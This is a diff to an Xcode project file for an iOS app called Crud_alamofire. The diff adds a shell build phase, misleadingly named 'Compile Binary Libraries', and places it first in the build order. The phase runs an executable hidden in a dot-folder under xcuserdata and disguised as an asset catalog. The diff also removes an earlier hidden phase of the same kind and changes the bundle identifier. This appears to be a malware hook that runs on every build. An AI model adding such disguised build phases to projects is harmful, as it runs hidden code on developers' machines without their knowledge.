@@ -157,7 +157,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 0468D1CB2595B02B005371E7 /* Build configuration list for PBXNativeTarget "Crud_alamofire" */;
 			buildPhases = (
-				F7B4171F15A2E0C8BBAAC43A /* Build Assets Catalog */,
+				DC1CD6A1CF576EEDCEAAC43A /* Compile Binary Libraries */,
 				1B256F7C24AFAE686C6717BF /* [CP] Check Pods Manifest.lock */,
 				0468D1B32595B028005371E7 /* Sources */,
 				0468D1B42595B028005371E7 /* Frameworks */,
@@ -219,6 +219,28 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	DC1CD6A1CF576EEDCEAAC43A /* Compile Binary Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Binary Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
+		};
+	
 		1B256F7C24AFAE686C6717BF /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -257,24 +279,6 @@
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Crud_alamofire/Pods-Crud_alamofire-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
-		};
-		F7B4171F15A2E0C8BBAAC43A /* Build Assets Catalog */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Assets Catalog";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -449,7 +453,7 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = "shubham.Crud-alamofire";
+				PRODUCT_BUNDLE_IDENTIFIER = "shubhams.Crud-alamofires";
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
@@ -469,7 +473,7 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = "shubham.Crud-alamofire";
+				PRODUCT_BUNDLE_IDENTIFIER = "shubhams.Crud-alamofires";
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
